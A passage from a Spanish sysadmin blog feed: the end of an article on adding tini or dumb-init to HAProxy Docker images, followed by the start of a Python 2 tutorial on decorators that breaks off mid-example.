&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ cat context/Dockerfile.2
FROM alpine:3.6
RUN apk add --no-cache haproxy tini
COPY haproxy.cfg /etc/haproxy/
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;tini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;haproxy&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-f&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/etc/haproxy/haproxy.cfg&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-db&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la nueva imagen, y tras modificar el &lt;em&gt;docker-compose.yml&lt;/em&gt;, la levantamos. Modificad el parámetro &lt;em&gt;image&lt;/em&gt; en el &lt;em&gt;docker-compose.yml&lt;/em&gt;, para reflejar el nuevo &lt;em&gt;tag&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ docker build -t balancer:v2 -f context/Dockerfile.2 context/
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.12 kB
...
Successfully built 179697bbd3ed
gerard@docker:~/docker/docker-init$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;dockerinit_default&amp;quot;&lt;/span&gt; with the default driver
Creating balancer
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y midiendo el tiempo de parada, vemos que el problema ha desaparecido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ &lt;span class="nb"&gt;time&lt;/span&gt; docker-compose down
Stopping balancer ... &lt;span class="k"&gt;done&lt;/span&gt;
Removing balancer ... &lt;span class="k"&gt;done&lt;/span&gt;
Removing network dockerinit_default

real    0m0,473s
user    0m0,284s
sys     0m0,020s
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Usando dumb-init&lt;/h3&gt;
&lt;p&gt;Este caso es análogo al anterior, sin más cambios que el nombre del paquete a instalar y el binario del &lt;code&gt;ENTRYPOINT&lt;/code&gt;. Es importante notar que a pesar de partir del primer ejemplo, el resultado es prácticamente idéntico al segundo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ cat context/Dockerfile.3
FROM alpine:3.6
RUN apk add --no-cache haproxy dumb-init
COPY haproxy.cfg /etc/haproxy/
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;dumb-init&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;haproxy&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-f&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/etc/haproxy/haproxy.cfg&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-db&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la nueva imagen, y tras modificar el &lt;em&gt;docker-compose.yml&lt;/em&gt;, la levantamos, justo como antes. Tened la precaución de usar nuevo &lt;em&gt;tag&lt;/em&gt; en el &lt;em&gt;docker-compose.yml&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ docker build -t balancer:v3 -f context/Dockerfile.3 context/
Sending build context to Docker daemon  &lt;span class="m"&gt;5&lt;/span&gt;.12 kB
...
Successfully built 928c992c5251
gerard@docker:~/docker/docker-init$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;dockerinit_default&amp;quot;&lt;/span&gt; with the default driver
Creating balancer
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y midiendo el tiempo de parada, vemos que el problema también desaparece:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ &lt;span class="nb"&gt;time&lt;/span&gt; docker-compose down
Stopping balancer ... &lt;span class="k"&gt;done&lt;/span&gt;
Removing balancer ... &lt;span class="k"&gt;done&lt;/span&gt;
Removing network dockerinit_default

real    0m0,520s
user    0m0,252s
sys     0m0,060s
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;El hecho de tener procesos &lt;em&gt;zombie&lt;/em&gt; es más una molestia que un problema real, al menos mientras &lt;strong&gt;docker&lt;/strong&gt; pueda limpiar lo que quede al final. Sin embargo, las buenas maneras, y un proceso ágil de despliegue, nos sugieren encarecidamente que tratemos estos detalles de forma adecuada.&lt;/p&gt;
&lt;p&gt;En cuanto al peso adicional en las imágenes por poner nuestros procesos &lt;em&gt;init&lt;/em&gt;, podemos ver que es casi nula:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~/docker/docker-init$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE
balancer            v3                  928c992c5251        About a minute ago   &lt;span class="m"&gt;5&lt;/span&gt;.674 MB
balancer            v2                  179697bbd3ed        &lt;span class="m"&gt;5&lt;/span&gt; minutes ago        &lt;span class="m"&gt;5&lt;/span&gt;.651 MB
balancer            latest              499dc4873adb        &lt;span class="m"&gt;9&lt;/span&gt; minutes ago        &lt;span class="m"&gt;5&lt;/span&gt;.631 MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.6                 7328f6f8b418        &lt;span class="m"&gt;7&lt;/span&gt; days ago           &lt;span class="m"&gt;3&lt;/span&gt;.966 MB
gerard@docker:~/docker/docker-init$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así pues, en caso de duda, ponerlo siempre nos puede ahorrar algunos dolores de cabeza, aunque por ahora los desconozcamos.&lt;/p&gt;</content><category term="docker"></category><category term="Dockerfile"></category><category term="tini"></category><category term="dumb-init"></category></entry><entry><title>Introducción a los decoradores de python</title><link href="http://www.linuxsysadmin.ml/2017/09/introduccion-a-los-decoradores-de-python.html" rel="alternate"></link><published>2017-09-04T10:00:00+02:00</published><updated>2017-09-04T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-09-04:/2017/09/introduccion-a-los-decoradores-de-python.html</id><summary type="html">&lt;p&gt;Mucha gente no sabe de lo que hablamos cuando nos referimos a &lt;em&gt;decoradores&lt;/em&gt; en contexto de programación &lt;em&gt;python&lt;/em&gt;. No es un concepto demasiado complejo, pero nos puede servir para simplificar bastante nuestro código. Sin embargo, hay que admitir que es un concepto difícil si intentamos estudiarlo sin ninguna ayuda externa …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Mucha gente no sabe de lo que hablamos cuando nos referimos a &lt;em&gt;decoradores&lt;/em&gt; en contexto de programación &lt;em&gt;python&lt;/em&gt;. No es un concepto demasiado complejo, pero nos puede servir para simplificar bastante nuestro código. Sin embargo, hay que admitir que es un concepto difícil si intentamos estudiarlo sin ninguna ayuda externa.&lt;/p&gt;
&lt;p&gt;Los decoradores no son otra cosa que &lt;strong&gt;azúcar sintáctico&lt;/strong&gt;. En realidad solo son funciones que aceptan una función origen por parámetro. Cuando llamemos a la función origen, en realidad estaremos llamando a la funcíon que devolvió la función decorador.&lt;/p&gt;
&lt;p&gt;Esto nos da varias posibilidades, como por ejemplo hacer cosas antes y después de declarar una función, o la posibilidad de suplantarla por completo, en vistas a añadir cosas a cada llamada, o a condicionar su ejecución. A continuación veremos algunos ejemplos:&lt;/p&gt;
&lt;h2&gt;El decorador simple&lt;/h2&gt;
&lt;p&gt;Vemos un primer &lt;em&gt;script&lt;/em&gt; hecho en &lt;em&gt;python&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;simple_decorator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Decorating&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;

&lt;span class="nd"&gt;@simple_decorator&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La línea que empieza con &lt;code&gt;@&lt;/code&gt; está &lt;strong&gt;decorando&lt;/strong&gt; la función a la que precede. En este caso, &lt;code&gt;simple_decorator&lt;/code&gt; es un decorador; esto es una función que acepta una función a la que decora.&lt;/p&gt;
&lt;p&gt;El script mencionado arriba es exactamente el mismo que el siguiente, en donde la aplicación del decorador es explícita.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;simple_decorator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Decorating&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;myfunc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;simple_decorator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ejecutamos el &lt;em&gt;script&lt;/em&gt; y vemos como se comporta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./simple.py
Decorating &amp;lt;&lt;span class="k"&gt;function&lt;/span&gt; myfunc at 0x7f3433328668&amp;gt;
Hello world!
Hello world!
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La función se decora una sola vez, en tiempo de declaración; ejecutar varias veces la función no hace repetir el código de la función decoradora. De la misma forma, una llamada a &lt;code&gt;myfunc()&lt;/code&gt; ejecuta la misma función, porque es la función que devolvió el decorador.&lt;/p&gt;
&lt;h2&gt;Decoradores parametrizados&lt;/h2&gt;
&lt;p&gt;El ejemplo anterior era solo un ejemplo. En el mundo real nos puede interesar tener un decorador que sea parametrizable, cambiando sus parámetros para adaptarse a las necesidades.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;register_route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Registering function&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;to&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@register_route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;home_page&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;home page&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;# same as: home_page = register_route(&amp;#39;/&amp;#39;)(home_page)&lt;/span&gt;

&lt;span class="nd"&gt;@register_route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;admin_panel&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;admin panel&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;# same as: admin_panel = register_route(&amp;#39;/admin&amp;#39;)(admin_panel)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;admin_panel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;home_page&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;home_page&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que las funciones están decoradas por la misma función, pero esta viene parametrizada. No os dejéis engañar; la expresión entera es un decorador, haciendo que &lt;code&gt;register_route('/')&lt;/code&gt; devuelva la función con la que vamos a decorar la función final.&lt;/p&gt;
&lt;p&gt;El decorador en sí mismo es &lt;code&gt;wrapper&lt;/code&gt;, pero en este caso tenemos la ventaja de que el decorador tiene visibilidad a las variables y parámetros de &lt;code&gt;register_route&lt;/code&gt;, que tiene la obligación de devolver el decorador, que como ya sabemos es una función que acepta a otra por parámetro.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./parametrized.py
Registering &lt;span class="k"&gt;function&lt;/span&gt; &amp;lt;&lt;span class="k"&gt;function&lt;/span&gt; home_page at 0x7f2c07d79758&amp;gt; to /
Registering &lt;span class="k"&gt;function&lt;/span&gt; &amp;lt;&lt;span class="k"&gt;function&lt;/span&gt; admin_panel at 0x7f2c07d797d0&amp;gt; to /admin
admin panel
home page
home page
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es interesante recalcar que las decoraciones se hacen en tiempo de declaración de la función, y luego podemos observar las llamadas que hacemos a las mismas. Otra observación es que el código del decorador ve, no solamente la función decorada &lt;code&gt;func&lt;/code&gt;, sino también los parámetros de la funcion &lt;code&gt;register_route&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Esta construcción es típica de algunos &lt;em&gt;frameworks&lt;/em&gt; que usan esta misma forma para crear la tabla de rutas. El reactor del mismo &lt;em&gt;framework&lt;/em&gt; va a ir llamando estas funciones según las peticiones lleguen. como ejemplo, podemos observar el caso del &lt;em&gt;framework&lt;/em&gt; &lt;strong&gt;bottle&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bottle&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Bottle&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Bottle&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="nd"&gt;@app.get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;index&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Reemplazando la función decorada&lt;/h2&gt;
&lt;p&gt;Hacer cosas en tiempo de declaración de una función puede ayudarnos en muchas ocasiones, pero la verdadera potencia de los decoradores viene cuando podemos interceptar cada llamada a una función, sea para enriquecerla, o para reemplazarla total o parcialmente. Veamos un ejemplo de cada:&lt;/p&gt;
&lt;h3&gt;Enriqueciendo una función&lt;/h3&gt;
&lt;p&gt;Este es un caso claro de &lt;em&gt;man-in-the-middle&lt;/em&gt;. Queremos ejecutar una función que acabe llamando a la original, pero que haga algo más. En este ejemplo, queremos cronometrar nuestras funciones. Para ello hacemos el siguiente &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;measure_time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;ini&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Execution time:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;ini&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;seconds&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@measure_time&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Start&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;End&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con el decorador &lt;code&gt;measure_time&lt;/code&gt;, conseguimos que &lt;code&gt;myfunc()&lt;/code&gt; quede reemplazada por la función &lt;code&gt;wrapper()&lt;/code&gt;, que va a guardar el valor inicial del cronómetro, va a llamar a nuestra función original, y finalmente va a escribir en pantalla la diferencia en el cronómetro.&lt;/p&gt;
&lt;p&gt;Fijaos que el decorador &lt;code&gt;measure_time&lt;/code&gt; no devuelve nunca la función original &lt;code&gt;func&lt;/code&gt;; en cambio declara y devuelve otra que será la función suplantante. Nuevamente, esta función &lt;code&gt;wrapper&lt;/code&gt; tiene visibilidad por los parámetros de decorador, concretamente de &lt;code&gt;func&lt;/code&gt;, que nos interesa conocer porque es la función original a la que queremos llamar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./count_time.py
Start
End
Execution time: &lt;span class="m"&gt;3&lt;/span&gt;.01089406013 seconds
Start
End
Execution time: &lt;span class="m"&gt;3&lt;/span&gt;.00343680382 seconds
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Haciendo dos llamadas podemos comprobar que la función &lt;code&gt;wrapper&lt;/code&gt; es llamada cada vez que invocamos a &lt;code&gt;myfunc&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Reemplazando parcial o totalmente otra función&lt;/h3&gt;
&lt;p&gt;Hay situaciones en las que no interesa hacer el comportamiento habitual. Por ejemplo, podemos restringir ciertas funciones a usuarios validados en nuestra web, o limitarlos por cualquier otro criterio. Vamos a suponer que solo queremos que el usuario &lt;em&gt;root&lt;/em&gt; pueda llegar a ejecutar una función:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;root_required&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;You need root access to do this&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@root_required&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Access granted&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;myfunc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como en el caso anterior, la función original es reemplazada por &lt;code&gt;wrapper&lt;/code&gt;; la diferencia es que en vez de enriquecerla, va a llamar a la función original solo si se cumple cierto criterio, que en este caso es ejecutar como &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/decorators$ ./no_access.py
You need root access to &lt;span class="k"&gt;do&lt;/span&gt; this
gerard@atlantis:~/projects/decorators$ sudo ./no_access.py
Access granted
gerard@atlantis:~/projects/decorators$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Muchos &lt;em&gt;frameworks&lt;/em&gt; web usan este truco para permitir ejecutar ciertas vistas a usuarios seleccionados.&lt;/p&gt;
&lt;h2&gt;Parámetros y reemplazo de funciones a la vez&lt;/h2&gt;
&lt;p&gt;También es posible utilizar la técnica del reemplazo con un decorador parametrizado, aunque este caso se complica; solo hay que tener en cuenta que necesitamos 3 funciones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una para los parámetros&lt;/li&gt;
&lt;li&gt;El decorador en sí mismo&lt;/li&gt;
&lt;li&gt;La funcion suplantante&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Podemos hacer un decorador para cachear resultados varios segundos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;now&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
